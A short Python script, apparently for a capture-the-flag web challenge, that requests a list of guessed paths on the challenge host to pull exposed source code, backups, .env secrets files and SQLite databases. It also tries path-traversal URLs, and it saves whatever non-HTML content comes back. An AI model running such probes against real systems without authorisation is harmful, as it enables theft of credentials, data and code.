# probe_source.py — try to grab the app source or the sqlite db (common in misconfigured challenges)
import requests
BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
paths = [
    "/app.py","/main.py","/server.py","/source","/src","/app","/style.css",
    "/static/style.css","/style.css.map","/app.py.bak","/.env","/config.py",
    "/database.db","/db.sqlite3","/images.db","/app.db","/instance/app.db",
    "/uploads/","/download","/backup.zip","/app.zip","/source.zip",
    "/../app.py","/static/../app.py","/favicon.ico",
]
for p in paths:
    try:
        r = requests.get(BASE+p, timeout=10)
        ct = r.headers.get("Content-Type","")
        print(f"{p:24} -> {r.status_code}  {ct:28} len={len(r.content)}")
        if r.status_code==200 and len(r.content)>0 and "text/html" not in ct:
            # save anything that isn't the generic html
            fn = p.strip('/').replace('/','_') or 'root'
            open("dl_"+fn,"wb").write(r.content)
            print(f"    saved dl_{fn}")
    except Exception as e:
        print(f"{p:24} -> ERR {e}")
